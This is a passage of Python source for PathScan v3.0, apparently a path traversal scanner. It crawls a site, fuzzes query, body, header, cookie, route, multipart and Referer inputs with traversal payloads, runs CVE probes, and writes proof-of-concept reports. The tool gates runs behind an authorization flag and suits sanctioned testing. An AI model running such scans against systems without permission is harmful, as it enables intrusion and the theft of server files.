            abs_url = urljoin(base_url, href)
            if self.scope.is_in_scope(abs_url) and abs_url not in self._visited:
                self._queue.put(abs_url)
            self._register_url_params(abs_url)

        # ── Images / scripts / iframes / src attrs ──
        for tag in soup.find_all(True):
            for attr in ["src", "data-src", "action"]:
                val = tag.get(attr, "").strip()
                if val:
                    abs_url = urljoin(base_url, val)
                    if self.scope.is_in_scope(abs_url):
                        self._register_url_params(abs_url)

        # ── Forms ──
        for form in soup.find_all("form"):
            action = form.get("action", base_url)
            method = (form.get("method", "GET")).upper()
            form_url = urljoin(base_url, action)
            if not self.scope.is_in_scope(form_url):
                continue
            params = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name", "")
                if name:
                    params.append(name)
            if params:
                self.endpoints.append({
                    "url": form_url, "params": params,
                    "method": method,
                    "location": "body" if method == "POST" else "query",
                    "source": "form",
                })

        # ── Script tags ──
        for script in soup.find_all("script"):
            src = script.get("src", "")
            if src:
                js_url = urljoin(base_url, src)
                if self.scope.is_in_scope(js_url) and js_url not in self._visited:
                    self._queue.put(js_url)
            if script.string:
                self._parse_js(base_url, script.string)

    def _parse_html_regex(self, base_url, html):
        """Fallback HTML parsing without BS4."""
        for href in re.findall(r'href=["\']([^"\']+)["\']', html, re.I):
            abs_url = urljoin(base_url, href)
            if self.scope.is_in_scope(abs_url) and abs_url not in self._visited:
                self._queue.put(abs_url)
            self._register_url_params(abs_url)
        for src in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I):
            abs_url = urljoin(base_url, src)
            if self.scope.is_in_scope(abs_url) and abs_url not in self._visited:
                self._queue.put(abs_url)
        # Forms
        for method, action, body in re.findall(
            r'<form[^>]*method=["\']?(\w+)["\']?[^>]*action=["\']?([^"\'> ]+)["\']?[^>]*>(.*?)</form>',
            html, re.I | re.S
        ):
            form_url = urljoin(base_url, action)
            if not self.scope.is_in_scope(form_url):
                continue
            params = re.findall(r'name=["\']([^"\']+)["\']', body, re.I)
            if params:
                self.endpoints.append({
                    "url": form_url, "params": params,
                    "method": method.upper(),
                    "location": "body" if method.upper() == "POST" else "query",
                    "source": "form",
                })

    def _parse_js(self, base_url, js_text):
        """Extract routes and params from JavaScript source."""
        parsed_base = urlparse(base_url)
        base_origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        # API-style paths: "/api/v1/something"
        for path in re.findall(r"""['"`](/[a-zA-Z0-9/_\-\.?=&%]+)['"`]""", js_text):
            abs_url = urljoin(base_origin, path)
            if self.scope.is_in_scope(abs_url):
                self._register_url_params(abs_url)
                if abs_url not in self._visited and "?" in path:
                    self._queue.put(abs_url)

        # fetch()/axios calls: fetch("/endpoint?param=value")
        for call in re.findall(
            r'(?:fetch|axios\.get|axios\.post|http\.get)\s*\(\s*[`\'"]([^`\'"]+)[`\'"]',
            js_text
        ):
            abs_url = urljoin(base_origin, call)
            if self.scope.is_in_scope(abs_url):
                self._register_url_params(abs_url)

        # Variable-style param keys: {filename: ..., path: ...}
        for key in re.findall(r"""['"`]([a-z_]+)['"`]\s*:""", js_text):
            if key in FILE_PARAM_KEYWORDS:
                # Register as a hint — we'll fuzz it against the base URL
                self.endpoints.append({
                    "url": base_url, "params": [key],
                    "method": "GET", "location": "query",
                    "source": "js_key_hint",
                })


# ─────────────────────────────────────────────────────────────────────────────
# RESPONSE ANALYZER
# ─────────────────────────────────────────────────────────────────────────────
class ResponseAnalyzer:
    def __init__(self):
        self.baseline_cache = {}

    def set_baseline(self, url, resp):
        if resp:
            self.baseline_cache[url] = {
                "status": resp.status_code,
                "length": len(resp.content),
                "text_head": resp.text[:5000],
            }

    def analyze(self, url, resp, timing_delta=None):
        """
        Returns (confidence, finding_type, evidence) or (None, None, None).
        """
        if not resp:
            return None, None, None

        # ── Oracle: content fingerprint ──────────────────────────────────────
        for pattern, label, confidence in ORACLE_PATTERNS:
            m = pattern.search(resp.text)
            if m:
                evidence = m.group(0)[:200]
                return confidence, f"Oracle: {label}", evidence

        # ── Error signatures ─────────────────────────────────────────────────
        for sig in ERROR_SIGNATURES:
            if sig in resp.text:
                return "MEDIUM", "Error: filesystem exception/stack trace", sig

        # ── Baseline anomaly ─────────────────────────────────────────────────
        if url in self.baseline_cache:
            bl = self.baseline_cache[url]
            if resp.status_code == 200 and bl["status"] != 200 and len(resp.content) > 200:
                return "LOW", "Status anomaly: error→200", \
                    f"Shifted from {bl['status']} → 200"
            if resp.status_code == 200 and bl["status"] == 200:
                ratio = difflib.SequenceMatcher(
                    None, bl["text_head"], resp.text[:5000]
                ).ratio()
                if ratio < 0.55 and abs(len(resp.content) - bl["length"]) > 500:
                    return "LOW", "Content structure anomaly", \
                        f"Similarity dropped to {int(ratio*100)}%, size delta {abs(len(resp.content)-bl['length'])}"

        # ── Blind timing oracle ──────────────────────────────────────────────
        if timing_delta is not None and timing_delta > 4.0:
            return "LOW", f"Blind timing anomaly ({timing_delta:.1f}s)", \
                f"Response took {timing_delta:.1f}s — possible filesystem access delay"

        return None, None, None


# ─────────────────────────────────────────────────────────────────────────────
# CHECKPOINT (resume support)
# ─────────────────────────────────────────────────────────────────────────────
class Checkpoint:
    def __init__(self, path):
        self.path = path
        self._lock = threading.Lock()
        self._done = set()
        self._load()

    def _load(self):
        if self.path and os.path.exists(self.path):
            try:
                with open(self.path) as f:
                    data = json.load(f)
                self._done = set(data.get("done", []))
                log_info(f"Checkpoint loaded: {len(self._done)} already-done fingerprints")
            except Exception:
                pass

    def is_done(self, key):
        return key in self._done

    def mark_done(self, key):
        with self._lock:
            self._done.add(key)
            if self.path:
                try:
                    with open(self.path, "w") as f:
                        json.dump({"done": list(self._done)}, f)
                except Exception:
                    pass

    @staticmethod
    def make_key(url, location, param, vector):
        raw = f"{url}|{location}|{param}|{vector}"
        return hashlib.md5(raw.encode()).hexdigest()


# ─────────────────────────────────────────────────────────────────────────────
# DEDUPLICATOR
# ─────────────────────────────────────────────────────────────────────────────
class Deduplicator:
    def __init__(self):
        self._seen = set()
        self._lock = threading.Lock()

    def is_dup(self, vuln):
        """Cluster same (endpoint_path, param, finding_type) — keep only highest confidence."""
        parsed = urlparse(vuln["endpoint"])
        key = (parsed.path, vuln["parameter"], vuln["finding_type"])
        with self._lock:
            if key in self._seen:
                return True
            self._seen.add(key)
            return False


# ─────────────────────────────────────────────────────────────────────────────
# MAIN SCANNER ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class Scanner:
    def __init__(self, req_mgr, scope, checkpoint=None, blind_timing=False):
        self.req = req_mgr
        self.scope = scope
        self.analyzer = ResponseAnalyzer()
        self.dedup = Deduplicator()
        self.checkpoint = checkpoint or Checkpoint(None)
        self.blind_timing = blind_timing
        self.vulnerabilities = []
        self._vuln_lock = threading.Lock()

    # ── Baseline capture ──────────────────────────────────────────────────────
    def capture_baselines(self, urls):
        log_info(f"Capturing {len(urls)} baseline responses...")
        for url in urls:
            if self.scope.is_in_scope(url):
                resp = self.req.execute("GET", url)
                self.analyzer.set_baseline(url, resp)

    # ── Fuzz a single (url, location, param, payload) combination ────────────
    def _fuzz_one(self, url, location, param, payload):
        vector = payload["vector"]
        ck_key = Checkpoint.make_key(url, location, param, vector)
        if self.checkpoint.is_done(ck_key):
            return

        target_url = url
        call_kwargs = {}
        method = "GET"

        parsed = urlparse(url)

        if location == "query":
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [vector]
            new_query = urlencode(qs, doseq=True)
            target_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, ""
            ))

        elif location == "body":
            method = "POST"
            call_kwargs["data"] = {param: vector}

        elif location == "json":
            method = "POST"
            call_kwargs["json"] = {param: vector}
            call_kwargs.setdefault("headers", {})
            call_kwargs["headers"]["Content-Type"] = "application/json"

        elif location == "header":
            call_kwargs["headers"] = {param: vector}

        elif location == "cookie":
            call_kwargs["cookies"] = {param: vector}

        elif location == "route":
            target_url = re.sub(rf"\{{{re.escape(param)}\}}", vector, url)

        elif location == "multipart":
            method = "POST"
            call_kwargs["files"] = {param: (vector, b"PATHSCAN", "application/octet-stream")}

        elif location == "referer":
            call_kwargs["headers"] = {"Referer": f"{parsed.scheme}://{parsed.netloc}/{vector}"}

        # Timing oracle
        t0 = time.monotonic() if self.blind_timing else None
        resp = self.req.execute(method, target_url, **call_kwargs)
        timing_delta = (time.monotonic() - t0) if t0 is not None else None

        self.checkpoint.mark_done(ck_key)

        if not resp:
            return

        conf, finding_type, evidence = self.analyzer.analyze(url, resp, timing_delta)
        if not conf:
            return

        vuln = {
            "endpoint":       url,
            "target_url":     target_url,
            "location":       location,
            "parameter":      param,
            "payload":        vector,
            "payload_category": payload.get("category", "unknown"),
            "payload_desc":   payload.get("desc", ""),
            "os_target":      payload.get("os", "any"),
            "finding_type":   finding_type,
            "confidence":     conf,
            "evidence":       evidence.strip() if evidence else "",
            "severity":       {"HIGH": "CRITICAL", "MEDIUM": "HIGH", "LOW": "MEDIUM"}[conf],
            "status_code":    resp.status_code,
            "response_size":  len(resp.content),
            "timestamp":      datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
            "cve":            payload.get("cve", ""),
        }

        if self.dedup.is_dup(vuln):
            return

        with self._vuln_lock:
            self.vulnerabilities.append(vuln)

        severity_display = {
            "CRITICAL": _c(Fore.RED,    "CRITICAL") if COLOR else "CRITICAL",
            "HIGH":     _c(Fore.YELLOW, "HIGH")     if COLOR else "HIGH",
            "MEDIUM":   _c(Fore.CYAN,   "MEDIUM")   if COLOR else "MEDIUM",
        }.get(vuln["severity"], vuln["severity"])

        log_hit(
            f"{severity_display} [{conf}] {location}:{param} → {finding_type} "
            f"| evidence: {evidence[:60]!r}"
        )

    # ── Fuzz all surfaces for one endpoint ────────────────────────────────────
    def fuzz_endpoint(self, endpoint_info):
        """
        endpoint_info: dict from Crawler with url, params, method, location
        """
        url     = endpoint_info["url"]
        params  = endpoint_info.get("params", [])
        method  = endpoint_info.get("method", "GET")
        location = endpoint_info.get("location", "query")

        if not self.scope.is_in_scope(url):
            return

        # ── A: fuzz all discovered params ────────────────────────────────────
        for param in params:
            is_file_param = param.lower() in FILE_PARAM_KEYWORDS or \
                            any(k in param.lower() for k in FILE_PARAM_KEYWORDS)

            for payload in ALL_PAYLOADS:
                # Skip heavy encoding variants for non-file params to reduce noise
                if not is_file_param and payload["category"] in (
                    "utf8_overlong", "null_byte", "truncation", "base64"
                ):
                    continue
                self._fuzz_one(url, location, param, payload)

        # ── B: high-value custom headers (always, regardless of params found) ─
        high_risk_headers = [
            "X-File-Path", "X-Local-File", "X-Forwarded-File",
            "X-Include-File", "Template-Name", "X-Template-Path",
            "X-Rewrite-URL", "X-Original-URL", "X-Custom-IP-Authorization",
        ]
        for header in high_risk_headers:
            for payload in ALL_PAYLOADS[:20]:   # top 20 for headers
                self._fuzz_one(url, "header", header, payload)

        # ── C: try multipart upload if POST ─────────────────────────────────
        if method == "POST":
            for param in params:
                for payload in ALL_PAYLOADS[:15]:
                    self._fuzz_one(url, "multipart", param, payload)

        # ── D: referer-based traversal ────────────────────────────────────────
        for payload in ALL_PAYLOADS[:10]:
            self._fuzz_one(url, "referer", "Referer", payload)

        # ── E: route params ({id}, {filename}) ───────────────────────────────
        route_params = re.findall(r"\{([a-zA-Z0-9_\-]+)\}", url)
        for rp in route_params:
            for payload in ALL_PAYLOADS:
                self._fuzz_one(url, "route", rp, payload)

    # ── CVE-targeted probes ───────────────────────────────────────────────────
    def run_cve_probes(self, base_url):
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        log_info(f"Running {len(CVE_PROBES)} CVE-specific probes against {origin}")

        for probe in CVE_PROBES:
            for path in probe["paths"]:
                target = origin + path
                if not self.scope.is_in_scope(target):
                    continue

                ck_key = Checkpoint.make_key(target, "cve", probe["cve"], path)
                if self.checkpoint.is_done(ck_key):
                    continue

                method = probe.get("method", "GET")
                probe_headers = probe.get("headers", {})
                kwargs = {}
                if probe_headers:
                    kwargs["headers"] = probe_headers

                resp = self.req.execute(method, target, **kwargs)
                self.checkpoint.mark_done(ck_key)

                if not resp:
                    continue
                if probe["check"](resp):
                    vuln = {
                        "endpoint":          base_url,
                        "target_url":        target,
                        "location":          "cve_probe",
                        "parameter":         "path",
                        "payload":           path,
                        "payload_category":  "cve",
                        "payload_desc":      probe["desc"],
                        "os_target":         "any",
                        "finding_type":      f"CVE Probe: {probe['cve']}",
                        "confidence":        "HIGH",
                        "evidence":          resp.text[:300].strip(),
                        "severity":          "CRITICAL",
                        "status_code":       resp.status_code,
                        "response_size":     len(resp.content),
                        "timestamp":         datetime.now(timezone.utc).strftime(
                                                 "%Y-%m-%d %H:%M:%S UTC"),
                        "cve":               probe["cve"],
                    }
                    if not self.dedup.is_dup(vuln):
                        with self._vuln_lock:
                            self.vulnerabilities.append(vuln)
                        log_hit(
                            f"CRITICAL [CVE] {probe['cve']}: {probe['desc'][:60]} "
                            f"→ {target}"
                        )


# ─────────────────────────────────────────────────────────────────────────────
# REPORT WRITERS
# ─────────────────────────────────────────────────────────────────────────────

def _severity_order(v):
    return {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}.get(v["severity"], 4)

def _confidence_order(v):
    return {"HIGH": 0, "MEDIUM": 1, "LOW": 2}.get(v["confidence"], 3)


def write_json_report(vulns, path):
    with open(path, "w") as f:
        json.dump({
            "tool": "PathScan v3.0",
            "generated": datetime.now(timezone.utc).isoformat(),
            "total": len(vulns),
            "critical": sum(1 for v in vulns if v["severity"] == "CRITICAL"),
            "high":     sum(1 for v in vulns if v["severity"] == "HIGH"),
            "medium":   sum(1 for v in vulns if v["severity"] == "MEDIUM"),
            "findings": sorted(vulns, key=_severity_order),
        }, f, indent=2)
    log_good(f"JSON report → {path}")


def write_markdown_report(vulns, path, domain):
    sorted_v = sorted(vulns, key=_severity_order)
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    with open(path, "w") as f:
        f.write(f"# PathScan v3.0 — Path Traversal Report\n\n")
        f.write(f"**Target:** `{domain}`  \n")
        f.write(f"**Generated:** {now}  \n")
        f.write(f"**Findings:** {len(vulns)} "
                f"(CRITICAL: {sum(1 for v in vulns if v['severity']=='CRITICAL')}, "
                f"HIGH: {sum(1 for v in vulns if v['severity']=='HIGH')}, "
                f"MEDIUM: {sum(1 for v in vulns if v['severity']=='MEDIUM')})\n\n")
        f.write("---\n\n")

        if not vulns:
            f.write("## ✅ No vulnerabilities confirmed.\n\n")
            f.write("This does not mean the target is safe — coverage depends on "
                    "which endpoints were crawled and whether authentication was provided.\n")
            return

        # Summary table
        f.write("## Summary Matrix\n\n")
        f.write("| # | Severity | Confidence | CVE | Endpoint | Parameter | Finding |\n")
        f.write("|---|----------|------------|-----|----------|-----------|--------|\n")
        for i, v in enumerate(sorted_v, 1):
            ep = urlparse(v["endpoint"]).path or "/"
            f.write(f"| {i} | **{v['severity']}** | {v['confidence']} "
                    f"| {v.get('cve','—')} | `{ep}` "
                    f"| `{v['parameter']}` | {v['finding_type']} |\n")
        f.write("\n---\n\n")

        # Detailed PoC per finding
        f.write("## Detailed Findings\n\n")
        for i, v in enumerate(sorted_v, 1):
            f.write(f"### Finding #{i} — {v['severity']} — {v['finding_type']}\n\n")
            if v.get("cve"):
                f.write(f"> **CVE:** {v['cve']}  \n")
            f.write(f"> **Confidence:** {v['confidence']}  \n")
            f.write(f"> **Timestamp:** {v['timestamp']}\n\n")

            f.write("**Endpoint Details**\n\n")
            f.write(f"- Source URL: `{v['endpoint']}`\n")
            f.write(f"- Injection Surface: `{v['location']}`\n")
            f.write(f"- Parameter: `{v['parameter']}`\n")
            f.write(f"- Payload Category: `{v['payload_category']}`\n")
            f.write(f"- OS Target: `{v['os_target']}`\n\n")

            f.write("**Reproduction Request**\n\n")
            f.write("```http\n")
            parsed = urlparse(v["target_url"])
            path_qs = parsed.path + ("?" + parsed.query if parsed.query else "")
            f.write(f"GET {path_qs} HTTP/1.1\n")
            f.write(f"Host: {parsed.netloc}\n")
            f.write(f"User-Agent: {DEFAULT_UA}\n")
            if v["location"] in ("body", "json", "multipart"):
                f.write(f"\n{v['parameter']}={v['payload']}\n")
            elif v["location"] == "header":
                f.write(f"{v['parameter']}: {v['payload']}\n")
            f.write("```\n\n")

            f.write("**Evidence**\n\n")
            f.write("```text\n")
            f.write(v.get("evidence", "(no evidence captured)") + "\n")
            f.write("```\n\n")

            f.write("**Remediation**\n\n")
            f.write("- Validate and canonicalize all file paths server-side before use.\n")
            f.write("- Use a whitelist of allowed filenames/paths, never user input directly.\n")
            f.write("- Apply the principle of least privilege to the web server process.\n")
            if v.get("cve"):
                f.write(f"- Apply vendor patch for {v['cve']} immediately.\n")
            f.write("\n---\n\n")

    log_good(f"Markdown report → {path}")


def write_html_report(vulns, path, domain):
    """Self-contained HTML report with color-coded severity, collapsible PoCs."""
    sorted_v = sorted(vulns, key=_severity_order)
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    total   = len(vulns)
    crit    = sum(1 for v in vulns if v["severity"] == "CRITICAL")
    high    = sum(1 for v in vulns if v["severity"] == "HIGH")
    medium  = sum(1 for v in vulns if v["severity"] == "MEDIUM")

    sev_color = {"CRITICAL": "#e74c3c", "HIGH": "#e67e22", "MEDIUM": "#3498db", "LOW": "#95a5a6"}
    conf_icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "🔵"}

    rows = ""
    for i, v in enumerate(sorted_v, 1):
        sc = sev_color.get(v["severity"], "#999")
        ep = urlparse(v["endpoint"]).path or "/"
        parsed = urlparse(v["target_url"])
        path_qs = parsed.path + ("?" + parsed.query if parsed.query else "")
        req_block = (
            f"GET {path_qs} HTTP/1.1\n"
            f"Host: {parsed.netloc}\n"
            f"User-Agent: {DEFAULT_UA}\n"
        )
        if v["location"] in ("body", "json"):
            req_block += f"\n{v['parameter']}={v['payload']}\n"
        elif v["location"] == "header":
            req_block += f"{v['parameter']}: {v['payload']}\n"

        cve_badge = f'<span class="cve-badge">{v["cve"]}</span>' if v.get("cve") else ""

        rows += f"""
        <div class="finding" id="f{i}">
          <div class="finding-header" onclick="toggle('body{i}')">
            <span class="sev-badge" style="background:{sc}">{v['severity']}</span>
            {conf_icon.get(v['confidence'], '⚪')} {v['finding_type']}
            {cve_badge}
            <span class="param-tag">{v['location']}:{v['parameter']}</span>
            <span class="path-tag">{ep}</span>
            <span class="toggle-arrow">▼</span>
          </div>
          <div class="finding-body" id="body{i}">
            <div class="meta-grid">
              <div><b>Confidence</b><br>{v['confidence']}</div>
              <div><b>Status Code</b><br>{v['status_code']}</div>
              <div><b>Response Size</b><br>{v['response_size']} bytes</div>
              <div><b>Payload Category</b><br>{v['payload_category']}</div>
              <div><b>OS Target</b><br>{v['os_target']}</div>
              <div><b>Timestamp</b><br>{v['timestamp']}</div>
            </div>
            <div class="section-label">Reproduction Request</div>
            <pre class="code-block">{_esc(req_block)}</pre>
            <div class="section-label">Evidence / Response Snippet</div>
            <pre class="code-block evidence">{_esc(v.get('evidence','(none)'))}</pre>
            <div class="section-label">Full Target URL</div>
            <pre class="code-block">{_esc(v['target_url'])}</pre>
          </div>
        </div>
        """

    no_findings_msg = ""
    if not vulns:
        no_findings_msg = """
        <div class="no-findings">
          ✅ No confirmed vulnerabilities.<br>
          <small>This does not guarantee safety — review crawl coverage and consider
          providing authentication cookies for deeper testing.</small>
        </div>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PathScan Report — {domain}</title>
<style>
  :root {{
    --bg: #0d1117; --surface: #161b22; --border: #30363d;
    --text: #c9d1d9; --muted: #8b949e; --link: #58a6ff;
  }}
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
          background: var(--bg); color: var(--text); padding: 24px; line-height: 1.6; }}
  h1 {{ font-size: 1.6rem; margin-bottom: 4px; color: #fff; }}
  .subtitle {{ color: var(--muted); font-size: .9rem; margin-bottom: 20px; }}
  .stat-bar {{ display: flex; gap: 12px; margin: 20px 0; flex-wrap: wrap; }}
  .stat {{ background: var(--surface); border: 1px solid var(--border);
           border-radius: 8px; padding: 12px 20px; text-align: center; }}
  .stat .num {{ font-size: 2rem; font-weight: 700; }}
  .stat .lab {{ font-size: .75rem; color: var(--muted); text-transform: uppercase; }}
  .crit {{ color: #e74c3c; }} .high {{ color: #e67e22; }}
  .med  {{ color: #3498db; }} .tot  {{ color: #fff; }}
  .finding {{ border: 1px solid var(--border); border-radius: 8px;
              margin-bottom: 12px; overflow: hidden; }}
  .finding-header {{ display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
                     padding: 12px 16px; cursor: pointer; background: var(--surface);
                     user-select: none; }}
  .finding-header:hover {{ background: #21262d; }}
  .sev-badge {{ color: #fff; border-radius: 4px; padding: 2px 8px;
                font-size: .75rem; font-weight: 700; white-space: nowrap; }}
  .cve-badge {{ background: #8957e5; color: #fff; border-radius: 4px;
                padding: 2px 8px; font-size: .7rem; font-weight: 600; }}
  .param-tag {{ background: #21262d; border: 1px solid var(--border); border-radius: 4px;
                padding: 1px 6px; font-family: monospace; font-size: .78rem; }}
  .path-tag {{ color: var(--muted); font-family: monospace; font-size: .78rem;
               margin-left: auto; }}
  .toggle-arrow {{ color: var(--muted); font-size: .8rem; }}
  .finding-body {{ display: none; padding: 16px; border-top: 1px solid var(--border); }}
  .finding-body.open {{ display: block; }}
  .meta-grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(140px,1fr));
                gap: 12px; margin-bottom: 14px; }}
  .meta-grid div {{ background: #0d1117; border-radius: 6px; padding: 8px 10px;
                    font-size: .82rem; }}
  .meta-grid b {{ display: block; color: var(--muted); font-size: .72rem;
                  text-transform: uppercase; margin-bottom: 2px; }}
  .section-label {{ font-size: .75rem; color: var(--muted); text-transform: uppercase;
                    letter-spacing: .05em; margin: 12px 0 4px; }}
  .code-block {{ background: #0d1117; border: 1px solid var(--border); border-radius: 6px;
                 padding: 10px 14px; font-family: "JetBrains Mono", monospace; font-size: .8rem;
                 overflow-x: auto; white-space: pre-wrap; word-break: break-all; }}
  .evidence {{ border-color: #e74c3c44; }}
  .no-findings {{ text-align: center; padding: 40px; color: var(--muted); }}
  .legend {{ font-size: .8rem; color: var(--muted); margin-top: 30px; }}
  @media(max-width:600px) {{ .stat-bar {{ gap: 8px; }} .stat .num {{ font-size: 1.4rem; }} }}
</style>
</head>
<body>
<h1>🔍 PathScan v3.0 — Path Traversal Report</h1>
<div class="subtitle">Target: <b>{domain}</b> &nbsp;|&nbsp; Generated: {now}</div>

<div class="stat-bar">
  <div class="stat"><div class="num tot">{total}</div><div class="lab">Total Findings</div></div>
  <div class="stat"><div class="num crit">{crit}</div><div class="lab">Critical</div></div>
  <div class="stat"><div class="num high">{high}</div><div class="lab">High</div></div>
  <div class="stat"><div class="num med">{medium}</div><div class="lab">Medium</div></div>
</div>

{no_findings_msg}
{rows}

<div class="legend">
  🔴 HIGH confidence — oracle match (file content confirmed) |
  🟡 MEDIUM — error/exception leakage |
  🔵 LOW — behavioral anomaly or timing signal
</div>

<script>
function toggle(id) {{
  const el = document.getElementById(id);
  el.classList.toggle('open');
}}
</script>
</body>
</html>
"""
    with open(path, "w") as f:
        f.write(html)
    log_good(f"HTML report → {path}")


def _esc(text):
    return str(text).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")


# ─────────────────────────────────────────────────────────────────────────────
# OPENAPI PARSER
# ─────────────────────────────────────────────────────────────────────────────
def parse_openapi(file_path, base_url):
    """Returns list of endpoint dicts from an OpenAPI/Swagger JSON spec."""
    endpoints = []
    try:
        with open(file_path) as f:
            spec = json.load(f)
        base_path = spec.get("basePath", "")
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        for path, methods in spec.get("paths", {}).items():
            for method, op in methods.items():
                if method.lower() not in ("get","post","put","patch","delete"):
                    continue
                params = []
                for p in op.get("parameters", []):
                    if p.get("in") in ("query","path","formData","body"):
                        params.append(p.get("name",""))
                ep_url = origin + base_path + path
                loc_map = {"query":"query","path":"route","formData":"body","body":"json"}
                for p in op.get("parameters", []):
                    loc = loc_map.get(p.get("in","query"), "query")
                    params_for_loc = [p.get("name","")]
                    endpoints.append({
                        "url": ep_url,
                        "params": params_for_loc,
                        "method": method.upper(),
                        "location": loc,
                        "source": "openapi",
                    })
        log_good(f"OpenAPI: extracted {len(endpoints)} endpoint×param pairs from {file_path}")
    except Exception as e:
        log_err(f"OpenAPI parse error: {e}")
    return endpoints


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="PathScan v3.0 — Complete Path Traversal Detection Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # PortSwigger lab (pass your session cookie):
  python pathscan.py -u https://LAB-ID.web-security-academy.net \\
      --cookies "session=abc123" --i-have-authorization

  # Full crawl with HTML report:
  python pathscan.py -u https://target.example.com \\
      --cookies "session=TOKEN" --rps 3 --threads 5 \\
      --out-html report.html --i-have-authorization

  # Resume a previous scan:
  python pathscan.py -u https://target.example.com \\
      --checkpoint scan.ckpt --i-have-authorization

  # With OpenAPI spec + proxy for Burp inspection:
  python pathscan.py -u https://api.target.com \\
      --openapi swagger.json --proxy http://127.0.0.1:8080 \\
      --i-have-authorization
        """
    )
    parser.add_argument("-u",  "--url",      help="Seed URL (homepage or specific endpoint)")
    parser.add_argument("-l",  "--list",     help="File containing target URLs (one per line)")
    parser.add_argument("--cookies",         help='Cookie header: "session=abc; csrftoken=xyz"')
    parser.add_argument("--auth",            help="Authorization header value (e.g. Bearer TOKEN)")
    parser.add_argument("--headers",         help='Extra headers as JSON: \'{"X-Api-Key":"abc"}\'')
    parser.add_argument("--proxy",           help="HTTP proxy (e.g. http://127.0.0.1:8080 for Burp)")
    parser.add_argument("--rps",   type=int, default=3,   help="Requests per second (default: 3)")
    parser.add_argument("--threads",type=int,default=5,   help="Thread pool size (default: 5)")
    parser.add_argument("--max-pages",type=int,default=100,help="Max pages to crawl (default: 100)")
    parser.add_argument("--openapi",         help="Path to OpenAPI/Swagger JSON spec file")
    parser.add_argument("--checkpoint",      help="Checkpoint file path (enables resume)")
    parser.add_argument("--blind-timing",    action="store_true",
                        help="Enable blind timing oracle (LOW confidence signal)")
    parser.add_argument("--skip-crawl",      action="store_true",
                        help="Skip crawler — only fuzz explicitly provided URLs")
    parser.add_argument("--skip-cve",        action="store_true",
                        help="Skip CVE-targeted probes")
    parser.add_argument("--out-md",   default="pathscan_report.md",   help="Markdown report path")
    parser.add_argument("--out-json", default="pathscan_report.json", help="JSON report path")
    parser.add_argument("--out-html", default="pathscan_report.html", help="HTML report path")
    parser.add_argument("--i-have-authorization", action="store_true",
                        help="REQUIRED: confirms you have explicit authorization to test the target")
    args = parser.parse_args()

    if not args.url and not args.list:
        parser.print_help()
        sys.exit(1)

    if not args.i_have_authorization:
        print(
            "\n[!] AUTHORIZATION REQUIRED\n"
            "    Pass --i-have-authorization to confirm you have explicit permission\n"
            "    (bug bounty program scope, VDP, or your own infrastructure).\n"
            "    Unauthorized scanning is illegal. This tool will not run without it.\n"
        )
        sys.exit(1)

    # ── Collect seed URLs ──────────────────────────────────────────────────
    seed_urls = []
    if args.url:
        seed_urls.append(args.url.rstrip("/"))
    if args.list and os.path.exists(args.list):
        with open(args.list) as f:
            seed_urls.extend(line.strip() for line in f if line.strip())
    if not seed_urls:
        log_err("No valid URLs provided.")
        sys.exit(1)

    base_url    = seed_urls[0]
    domain      = urlparse(base_url).netloc
    scope       = ScopeValidator(base_url)
    checkpoint  = Checkpoint(args.checkpoint)

    custom_headers = {}
    if args.headers:
        try:
            custom_headers = json.loads(args.headers)
        except Exception:
            log_warn(f"Could not parse --headers JSON: {args.headers}")

    req_mgr = RequestManager(
        cookies=args.cookies, auth_header=args.auth,
        custom_headers=custom_headers, rps=args.rps, proxy=args.proxy
    )
    scanner = Scanner(req_mgr, scope, checkpoint=checkpoint,
                      blind_timing=args.blind_timing)

    # ── Discover endpoints ─────────────────────────────────────────────────
    all_endpoints = []

    if not args.skip_crawl:
        crawler = Crawler(req_mgr, scope, max_pages=args.max_pages)
        for seed in seed_urls:
            crawled = crawler.crawl(seed)
            all_endpoints.extend(crawled)
    else:
        # If skipping crawler, treat each URL as an endpoint with no known params
        for seed in seed_urls:
            all_endpoints.append({"url": seed, "params": [], "method": "GET",
                                   "location": "query", "source": "manual"})
            scanner.analyzer.set_baseline(seed, req_mgr.execute("GET", seed))

    # Add OpenAPI endpoints
    if args.openapi and os.path.exists(args.openapi):
        all_endpoints.extend(parse_openapi(args.openapi, base_url))

    # Deduplicate endpoint list
    seen_eps = set()
    unique_eps = []
    for ep in all_endpoints:
        key = (ep["url"], ep.get("location",""), tuple(sorted(ep.get("params",[]))))
        if key not in seen_eps:
            seen_eps.add(key)
            unique_eps.append(ep)
    all_endpoints = unique_eps

    # Baselines
    baseline_urls = list({ep["url"] for ep in all_endpoints})
    scanner.capture_baselines(baseline_urls[:50])  # cap at 50 to avoid huge pre-scan

    log_good(f"Surface: {len(all_endpoints)} endpoint×surface combinations to fuzz")
    log_info(f"Payload library: {len(ALL_PAYLOADS)} vectors · Threads: {args.threads}")

    # ── CVE probes ─────────────────────────────────────────────────────────
    if not args.skip_cve:
        for seed in seed_urls:
            scanner.run_cve_probes(seed)

    # ── Fuzz engine ────────────────────────────────────────────────────────
